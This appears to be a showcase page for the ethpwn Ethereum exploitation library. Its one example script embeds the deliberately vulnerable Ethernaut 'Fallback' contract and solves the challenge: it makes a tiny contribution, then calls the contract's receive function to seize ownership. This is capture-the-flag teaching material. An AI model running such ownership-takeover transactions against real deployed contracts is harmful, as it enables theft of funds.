# Showroom


## Example 1


```py

#!/usr/bin/env python3

import sys
import argparse
from time import sleep
from ethpwn.prelude import *

CONTRACT_SOURCE = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
'''

parser = argparse.ArgumentParser()
parser.add_argument('node_url', type=str, help='The node url to connect to')
parser.add_argument('target_addr', type=str, help='The address of the contract to interact with')
ARGS = parser.parse_args()

context.log_level = 'DEBUG'

context.connect_http(ARGS.node_url)

CONTRACT_METADATA.add_solidity_source(CONTRACT_SOURCE, 'Fallback.sol')

target = CONTRACT_METADATA['Fallback'].get_contract_at(ARGS.target_addr)

# set our contribution to non-zero
transact(target.functions.contribute(), value=wei(ether=0.0001))
transact(target.receive(), value=wei(ether=0.0001))

```